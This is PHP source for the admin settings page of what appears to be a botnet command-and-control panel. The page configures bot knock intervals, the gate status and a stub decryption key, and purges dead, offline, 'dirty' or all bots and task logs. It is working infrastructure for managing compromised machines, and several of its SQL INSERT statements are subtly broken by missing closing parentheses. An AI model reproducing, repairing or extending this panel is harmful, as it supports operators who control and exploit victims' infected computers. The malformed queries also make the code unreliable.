<?php
include_once("./includes/header.php"); 
?>
<main>
		 <div class="container">
   <h1 class="thin">Settings</h1>
    <div id="dashboard">
           <div class="row">			

						<?php
						if ($userperms != "admin")
						{
							echo '<div class="alert alert-danger">You do not have permission to view this page.</div>';
							die();
						}
						if (isset($_GET['clear']))
						{
							$clear = strtolower($_GET['clear']);
							$safe = array("dead", "offline", "dirty", "all", "tasklogs");
							if (in_array($clear, $safe))
							{
								if ($clear == "dead")
								{
									$d = $odb->prepare("DELETE FROM bots WHERE lastresponse + :d < UNIX_TIMESTAMP()");
									$d->execute(array(":d" => $deadi));
									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared dead bots from table', UNIX_TIMESTAMP())");
									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								}else if ($clear == "offline"){
									$o = $odb->prepare("DELETE FROM bots WHERE (lastresponse + :o < UNIX_TIMESTAMP()) AND (lastresponse + :d > UNIX_TIMESTAMP())");
									$o->execute(array(":o" => $knock + 120, ":d" => $deadi));
									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared offline bots from table', UNIX_TIMESTAMP())");
									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								}else if ($clear == "dirty"){
									$odb->query("DELETE FROM bots WHERE mark = '2'");
									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared dirty bots from table', UNIX_TIMESTAMP()");
									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								}else if ($clear == "tasklogs"){
									$odb->query("TRUNCATE tasks_completed");
									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared task execution logs from table', UNIX_TIMESTAMP()");
									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								}else{
									$odb->query("TRUNCATE bots");
									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared all bots from table', UNIX_TIMESTAMP()");
									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								}
								echo '<div class="alert alert-success">Successfully cleared entries. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=settings">';
							}else{
								echo '<div class="alert alert-danger">Invalid clear option. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=settings">';
							}
						}
						if (isset($_POST['updateSettings']))
						{$newstub_id = $_POST['stub'];
							$newknock = $_POST['knock'];
							$newdead = $_POST['dead'];
							$newgate = $_POST['gstatus'];
							
							if (!ctype_digit($newknock) || !ctype_digit($newdead) || !ctype_digit($newgate) )
							{
								echo '<div class="alert alert-danger">One of the parameters was not a digit. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=settings">';
							}else{
								$up = $odb->prepare("UPDATE settings SET knock = :k, dead = :d, gate_status = :g, stub_id = :s LIMIT 1");
								$up->execute(array(":k" => $newknock, ":d" => $newdead, ":g" => $newgate, ":s" => $newstub_id));
								$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Updated panel settings', UNIX_TIMESTAMP())");
								$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								echo '<div class="alert alert-success">Settings successfully updated. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=settings">';
								
							}
						}
						?> <div class="col s12">  
      <ul class="tabs tabs-fixed-width z-depth-1">
	       

        <li class="tab col s3"><a href="#main">Main</a></li>
        <li class="tab col s3"><a href="#database">Database</a></li>
      </ul>
    </div> <div id="main" class="col s12">
						<div class="card">
        <div class="card-content">
									<form action="" method="POST" class="col-lg-6">
									<label>Decryption Key ( <font color="red"><b>WARNING => </b>Changing the Decryption Key will cause of loosing all your of  previous bots!!</font> )</label>
										<div class="input-group">
											<input type="text" name="stub" class="form-control" value="<?php echo $odb->query("SELECT stub_id FROM settings LIMIT 1")->fetchColumn(0); ?>">
											
										</div>
										<br>
										<label>Knock Interval</label>
										<div class="input-group">
											<input type="text" name="knock" class="form-control" value="<?php echo $odb->query("SELECT knock FROM settings LIMIT 1")->fetchColumn(0); ?>">
											<span class="input-group-addon">Minutes</span>
										</div>
										<br>
										<label>Dead after</label>
										<div class="input-group">
											<input type="text" name="dead" class="form-control" value="<?php echo $odb->query("SELECT dead FROM settings LIMIT 1")->fetchColumn(0); ?>">
											<span class="input-group-addon">Days</span>
										</div>
										<br>
										<label>Gate Status</label>
										<select name="gstatus" class="form-control">
											<?php
											$val = $odb->query("SELECT gate_status FROM settings LIMIT 1")->fetchColumn(0);
											if ($val == "1")
											{
												echo '<option value="1" selected>Enabled</option><option value="2">Disabled</option>';
											}else{
												echo '<option value="1">Enabled</option><option value="2" selected>Disabled</option>';
											}
											?>
										</select>
										<br>
										
										<center><input type="submit" name="updateSettings" class="btn btn-success" value="Update Settings"></center>
									</form>
									<div class="clearfix"></div>
								</div></div></div>
								<div id="database" class="col s12">
      <div class="card">
        <div class="card-content">
        
            <div class="row">
			<div class="tab-pane" id="database">
									<h3>Statistics</h3>
									<p>The database is currently using <b><?php echo $odb->query("SELECT ROUND(SUM(data_length + index_length) / 1024, 2) FROM information_schema.TABLES WHERE table_schema = (SELECT DATABASE())")->fetchColumn(0); ?> KB</b> of space, with <b><?php echo number_format($odb->query("SELECT SUM(table_rows) FROM information_schema.TABLES WHERE table_schema = (SELECT DATABASE())")->fetchColumn(0)); ?></b> rows in total.</p>
									<hr>
									<h3>Optimization</h3>
									<a href="?p=settings&clear=dead" class="btn btn-danger">Clear Dead Bots</a>
									<a href="?p=settings&clear=offline" class="btn btn-danger">Clear Offline Bots</a>
									<a href="?p=settings&clear=dirty" class="btn btn-danger">Clear Dirty Bots</a>
									<a onclick="ask('1')" class="btn btn-danger">Clear All Bots</a>
									<a onclick="ask('2')" class="btn btn-danger">Clear Task Execution Logs</a>
								</div>
							</div>
						</div>
					</div>
				</div>
			</section>
		</aside>
	</div>
	<script src="js/jquery.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/jquery-ui.min.js" type="text/javascript"></script>
	<script type="text/javascript">
		function ask(id)
		{
			if (id == "1")
			{
				if (confirm("WARNING: You are about to clear all of the bots from your database! Are you sure you want to do this?"))
				{
					setTimeout('window.location = "?p=settings&clear=all"', 1000);
				}
			}else{
				if (confirm("WARNING: You are about to clear all task execution logs from your database! This could lead to inaccurate numbers on the Tasks page. Are you sure you want to do this?"))
				{
					setTimeout('window.location = "?p=settings&clear=tasklogs"', 1000);
				}
			}
		}
	</script>
</main>
<?php include_once('includes/footer.php'); ?>